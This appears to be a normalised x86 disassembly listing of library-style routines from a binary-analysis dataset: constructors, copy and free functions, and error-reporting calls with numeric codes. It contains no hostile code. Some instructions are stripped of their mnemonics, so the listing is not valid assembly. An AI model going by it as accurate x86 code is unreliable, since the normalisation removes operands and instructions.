mov edi [ eax + 0x8 ]
mov esi [ esp + 0x1c ]
xor edx edx
[ esi ] [ edi ]
jne r-xdata
cmp edi 0x3
jne r-xdata
cmp eax 0x8
je r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push 0xf8
push r--data
push 0x64
jmp r-xdata
cmp eax 0x7
jne r-xdata
push r--data
push _itoa@IAT
call fprintf
add esp 0x8
push ebx
call sub_1004d900
add esp 0x4
push 0x77
push 0x4
call sub_1001de60
add esp 0x14
sub_1002c320
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
cmp ebx edi
jne r-xdata
cmp [ ebx + 0x4 ] edi
jne r-xdata
push 0x52
push r--data
push 0x43
push 0x6c
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x5b
push r--data
push 0xa8
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi edi
jne r-xdata
push 0x57
push r--data
push 0x42
push 0x6c
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
lea eax [ esi + 0x8 ]
mov [ esi ] ebx
push eax
mov [ esi + 0x44 ] edi
mov [ esi + 0x4 ] edi
call sub_10029990
lea ecx [ esi + 0x1c ]
push ecx
call sub_10029990
push esi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x4
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
call [ ebx + 0x4 ]
add esp 0xc
test eax eax
jne r-xdata
push 0x5e
push r--data
push 0x41
push 0x6c
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebx
retn
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1002c3f0
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push ebp
lea ebp [ ebx + 0x44 ]
test ebp ebp
push esi
je r-xdata
push ebx
call eax
add esp 0x4
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
lea eax [ ebx + 0x8 ]
push eax
call sub_10029950
lea ecx [ ebx + 0x1c ]
push ecx
call sub_10029950
mov eax [ ebx + 0x3c ]
add esp 0x8
test eax eax
pop esi
pop ebp
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x28 ]
test eax eax
je r-xdata
mov [ ebp ] 0x0
push edi
push ebx
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push esi
call eax
add esp 0x4
mov ecx [ esi + 0x4 ]
mov edi [ esi ]
push ecx
call [ esi + 0xc ]
push esi
call sub_1001d740
add esp 0x8
mov esi edi
test edi edi
jne r-xdata
pop edi
sub_1002c490
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ ebx ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push ebx
call ecx
jmp r-xdata
push ebp
lea ebp [ ebx + 0x44 ]
test ebp ebp
push esi
je r-xdata
push ebx
call eax
add esp 0x4
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
lea ecx [ ebx + 0x8 ]
push ecx
call sub_100298f0
lea edx [ ebx + 0x1c ]
push edx
call sub_100298f0
mov eax [ ebx + 0x3c ]
add esp 0x8
test eax eax
pop esi
pop ebp
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
mov [ ebp ] 0x0
push edi
push 0xa8
push ebx
call sub_10026870
push ebx
call sub_1001d740
add esp 0xc
mov ecx [ ebx + 0x40 ]
push ecx
push eax
call sub_10026870
mov edx [ ebx + 0x3c ]
push edx
call sub_1001d740
add esp 0xc
test eax eax
je r-xdata
push esi
call ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edi [ esi ]
push eax
call [ esi + 0x10 ]
push esi
call sub_1001d740
add esp 0x8
mov esi edi
test edi edi
jne r-xdata
pop edi
push 0x44
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
add esp 0x4
push esi
call eax
sub_1002c570
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov eax [ ebx ]
push edi
mov ecx [ eax + 0x10 ]
test ecx ecx
jne r-xdata
mov edi [ esp + 0x18 ]
cmp eax [ edi ]
je r-xdata
push 0xb1
push r--data
push 0x42
push 0x6a
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp ebx edi
jne r-xdata
push 0xb6
push r--data
push 0x65
push 0x6a
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
lea ebp [ ebx + 0x44 ]
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov esi [ edi + 0x44 ]
test esi esi
je r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call [ esi + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov [ ebp ] 0x0
mov eax [ esi + 0x4 ]
mov edi [ esi ]
push eax
call [ esi + 0xc ]
push esi
call sub_1001d740
add esp 0x8
mov esi edi
test edi edi
jne r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
push edx
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
push ebp
call sub_1002cfc0
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
lea ecx [ edi + 0x8 ]
lea edx [ ebx + 0x8 ]
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ edi + 0x4 ]
mov esi [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
jne r-xdata
test ebx ebx
jne r-xdata
mov esi [ esi ]
test esi esi
jne r-xdata
lea eax [ edi + 0x1c ]
lea ecx [ ebx + 0x1c ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test eax eax
je r-xdata
push esi
call ecx
jmp r-xdata
cmp esi [ edx ]
je r-xdata
push 0x2f2
push r--data
push 0x42
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ ebx ]
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
push 0x2bb
push r--data
push 0x43
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
mov edx [ edi + 0x30 ]
xor esi esi
mov [ ebx + 0x30 ] edx
mov eax [ edi + 0x34 ]
mov [ ebx + 0x34 ] eax
mov ecx [ edi + 0x38 ]
mov [ ebx + 0x38 ] ecx
mov eax [ edi + 0x3c ]
cmp eax esi
mov eax [ ebx + 0x3c ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x44
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
mov [ ebx + 0x4 ] 0x0
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
add esp 0x4
cmp eax edx
je r-xdata
push 0x2f7
push r--data
push 0x65
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x2c4
push r--data
push 0x44
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push 0x2c0
push r--data
push 0x42
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
test eax eax
mov [ ebx + 0x4 ] eax
jne r-xdata
cmp eax esi
je r-xdata
cmp eax esi
je r-xdata
push esi
call eax
push edx
push eax
call ecx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebx ]
push esi
mov [ esi ] eax
call [ eax + 0x24 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x2c7
push r--data
push 0x41
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx ]
push edi
push ebx
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] esi
call [ edx + 0x10 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call sub_1001d740
add esp 0x4
mov edx [ edi + 0x40 ]
push 0xe6
push r--data
push edx
call sub_1001d4c0
add esp 0xc
cmp eax esi
mov [ ebx + 0x3c ] eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax esi
push esi
call sub_1001d740
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
mov esi [ edi + 0x3c ]
mov edi eax
mov eax ecx
mov edx edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esp + 0x18 ]
mov edx [ ebx ]
mov edi eax
mov ecx [ eax + 0x40 ]
push edi
push ebx
mov [ ebx + 0x40 ] ecx
call [ edx + 0x10 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1002c890
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1002c320
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
pop edi
xor eax eax
pop esi
retn
push esi
push edi
call sub_1002c570
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax edi
pop edi
pop esi
retn
mov ecx [ edi ]
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
push ebp
lea ebp [ edi + 0x44 ]
test ebp ebp
je r-xdata
push edi
call eax
add esp 0x4
mov esi [ edi + 0x4 ]
pop ebp
test esi esi
je r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
lea ecx [ edi + 0x8 ]
push ecx
call sub_10029950
lea edx [ edi + 0x1c ]
push edx
call sub_10029950
mov eax [ edi + 0x3c ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
mov [ ebp ] 0x0
push ebx
push edi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
retn
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push esi
call eax
add esp 0x4
mov edx [ esi + 0x4 ]
mov ebx [ esi ]
push edx
call [ esi + 0xc ]
push esi
call sub_1001d740
add esp 0x8
mov esi ebx
test ebx ebx
jne r-xdata
pop ebx
sub_1002c970
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
test ebx ebx
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push 0x120
push r--data
push 0x43
push 0x6f
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx [ eax ]
mov ecx [ edx + 0x30 ]
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
cmp edx [ ebx ]
je r-xdata
push 0x2f2
push r--data
push 0x42
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
push 0x2bb
push r--data
push 0x43
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
push 0x2f7
push r--data
push 0x65
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x2c4
push r--data
push 0x44
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push 0x2c0
push r--data
push 0x42
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
test eax eax
mov [ edi + 0x4 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push ebx
push eax
call ecx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi ]
push esi
mov [ esi ] eax
call [ eax + 0x24 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x2c7
push r--data
push 0x41
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
lea edx [ edi + 0x8 ]
push 0x0
push edx
call sub_10029cf0
add esp 0x8
lea ecx [ edi + 0x8 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
push esi
call sub_1001d740
add esp 0x4
xor eax eax
jmp r-xdata
add edi 0x1c
push 0x0
push edi
call sub_10029cf0
add esp 0x8
add edi 0x1c
push eax
push edi
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_1002cb20
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
add eax 0x8
push eax
push esi
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
xor eax eax
test ecx ecx
setne al
pop esi
retn
pop esi
retn
sub_1002cb80
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
xor edi edi
mov eax [ ebp + 0x3c ]
cmp eax edi
je r-xdata
mov ebx [ esp + 0x1c ]
cmp ebx edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov [ ebp + 0x3c ] edi
mov [ ebp + 0x40 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi edi
je r-xdata
push 0x182
push r--data
push ebx
call sub_1001d4c0
add esp 0xc
cmp eax edi
mov [ ebp + 0x3c ] eax
jne r-xdata
mov ecx ebx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ ebp + 0x40 ] ebx
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_1002cc00
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
push ecx
call eax
add esp 0x14
retn
push 0x19b
push r--data
push 0x42
push 0x6d
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002cc50
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push edx
push ecx
call eax
add esp 0x14
retn
push 0x1b1
push r--data
push 0x42
push 0xb0
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002cca0
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
test eax eax
jne r-xdata
push ecx
call eax
add esp 0x4
retn
push 0x1c7
push r--data
push 0x42
push 0xad
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002cce0
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
mov edi [ esp + 0x28 ]
mov ecx [ ebp ]
xor ebx ebx
mov eax [ edi ]
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] ebx
mov edx [ eax ]
mov eax [ ecx ]
cmp edx eax
je r-xdata
mov ecx [ edi + 0x30 ]
cmp ecx ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x30 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x30 ]
cmp eax ebx
je r-xdata
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov [ esp + 0x34 ] eax
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
push esi
mov [ esp + 0x34 ] eax
call sub_1002de70
push esi
mov [ esp + 0x2c ] eax
call sub_1002de70
push esi
mov [ esp + 0x34 ] eax
call sub_1002de70
mov ebx eax
add esp 0x1c
test ebx ebx
jne r-xdata
call sub_1002dc50
mov esi eax
cmp esi ebx
mov [ esp + 0x10 ] esi
jne r-xdata
cmp ecx eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x30 ]
mov eax [ edi ]
push esi
push ecx
mov ecx [ esp + 0x30 ]
push edx
push ecx
push edi
call [ eax + 0x18 ]
add esp 0x14
test eax eax
je r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov [ esp + 0x1c ] 0x1
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ ebp ]
push esi
push ebx
push eax
push ecx
push ebp
call [ edx + 0x18 ]
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
push esi
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push esi
call sub_1002dcb0
add esp 0x4
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x28 ]
push edx
push eax
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
push ebx
push eax
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ edi ]
mov ebx [ ebp + 0x4 ]
mov edx [ edi + 0x4 ]
mov eax [ ecx + 0x68 ]
test eax eax
jne r-xdata
mov ebp [ edx ]
cmp ecx ebp
jne r-xdata
push 0x427
push r--data
push 0x42
push 0x71
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x42c
push r--data
push 0x65
push 0x71
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp ebp [ ebx ]
jne r-xdata
mov ebx [ esp + 0x28 ]
lea ecx [ edi + 0x8 ]
push ecx
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebp [ esp + 0x2c ]
push esi
push ebx
push edx
push edi
call eax
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebx + 0x4 ]
xor eax eax
test edx edx
setne al
test eax eax
je r-xdata
mov ebx [ esp + 0x14 ]
lea edx [ ebp + 0x8 ]
push edx
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
xor eax eax
test edx edx
setne al
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
lea eax [ edi + 0x1c ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi + 0x20 ]
xor eax eax
test edx edx
setne al
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
lea edx [ ebp + 0x1c ]
push edx
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x20 ]
xor eax eax
test edx edx
setne al
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
push ebx
push eax
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
push edi
push ecx
call sub_1002a000
add esp 0x8
test eax eax
je r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
sub_1002cfc0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
jne r-xdata
mov eax [ esi ]
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x20 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ eax + 0x8 ]
cmp edx ecx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x23a
push r--data
push 0x14
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
cmp [ eax + 0xc ] ebp
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ebp
mov [ eax + 0x10 ] ebx
mov ecx [ esi ]
mov [ eax ] ecx
mov [ esi ] eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax + 0x10 ] ebx
je r-xdata
push 0x231
push r--data
push 0x6c
push 0xd3
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1002d070
mov eax [ esp + 0x4 ]
push esi
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov esi [ esp + 0xc ]
mov eax [ eax ]
test eax eax
jne r-xdata
cmp [ eax + 0xc ] edx
jne r-xdata
cmp [ eax + 0x8 ] esi
jne r-xdata
cmp [ eax + 0x10 ] ecx
je r-xdata
mov eax [ eax + 0x4 ]
pop esi
retn
sub_1002d0b0
push esi
mov esi [ esp + 0x8 ]
push edi
test esi esi
je r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov esi eax
mov eax [ esi ]
test eax eax
jne r-xdata
cmp [ eax + 0xc ] edx
jne r-xdata
cmp [ eax + 0x8 ] edi
jne r-xdata
pop edi
pop esi
retn
cmp [ eax + 0x10 ] ecx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov edi [ eax ]
push ecx
call [ eax + 0xc ]
mov edx [ esi ]
push edx
call sub_1001d740
add esp 0x8
mov [ esi ] edi
sub_1002d110
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
push esi
mov esi [ ebx ]
test esi esi
je r-xdata
mov [ ebx ] 0x0
pop esi
push edi
mov eax [ esi + 0x4 ]
mov edi [ esi ]
push eax
call [ esi + 0xc ]
push esi
call sub_1001d740
add esp 0x8
mov esi edi
test edi edi
jne r-xdata
pop edi
sub_1002d150
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
push 0x2bb
push r--data
push 0x43
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push 0x2c4
push r--data
push 0x44
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push 0x2c0
push r--data
push 0x42
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ edi ]
push esi
mov [ esi ] eax
call [ eax + 0x24 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x2c7
push r--data
push 0x41
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax esi
pop edi
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
retn
sub_1002d200
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
push esi
call eax
add esp 0x4
sub_1002d230
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx [ eax + 0x2c ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push esi
call ecx
jmp r-xdata
push 0x44
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
add esp 0x4
push esi
call eax
sub_1002d270
mov edx [ esp + 0x4 ]
push esi
mov eax [ edx ]
mov esi [ eax + 0x30 ]
test esi esi
jne r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ ecx ]
cmp eax edi
pop edi
je r-xdata
push 0x2f2
push r--data
push 0x42
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
cmp edx ecx
jne r-xdata
push 0x2f7
push r--data
push 0x65
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push ecx
push edx
call esi
add esp 0x8
pop esi
retn
mov eax 0x1
pop esi
retn
sub_1002d2e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov edi [ esp + 0x14 ]
test edi edi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov eax [ edi ]
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
push 0x2bb
push r--data
push 0x43
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x2c4
push r--data
push 0x44
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push 0x2c0
push r--data
push 0x42
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
push esi
mov [ esi ] eax
call [ eax + 0x24 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x2c7
push r--data
push 0x41
push 0x79
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi ]
mov eax [ ecx + 0x30 ]
test eax eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn
cmp ecx [ ebx ]
je r-xdata
push 0x2f2
push r--data
push 0x42
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp esi ebx
je r-xdata
push 0x2f7
push r--data
push 0x65
push 0x72
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push ebx
push esi
call eax
add esp 0x8
test eax eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn
push esi
call eax
add esp 0x4
sub_1002d410
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x34 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x31d
push r--data
push 0x42
push 0x7f
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push edx
push esi
call ecx
add esp 0x8
pop esi
retn
push 0x322
push r--data
push 0x65
push 0x7f
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d470
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x38 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x32e
push r--data
push 0x42
push 0x7e
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
push edx
push esi
call ecx
add esp 0x18
pop esi
retn
push 0x333
push r--data
push 0x65
push 0x7e
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d4e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x40 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x350
push r--data
push 0x42
push 0x7c
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x355
push r--data
push 0x65
push 0x7c
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d550
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x40 ]
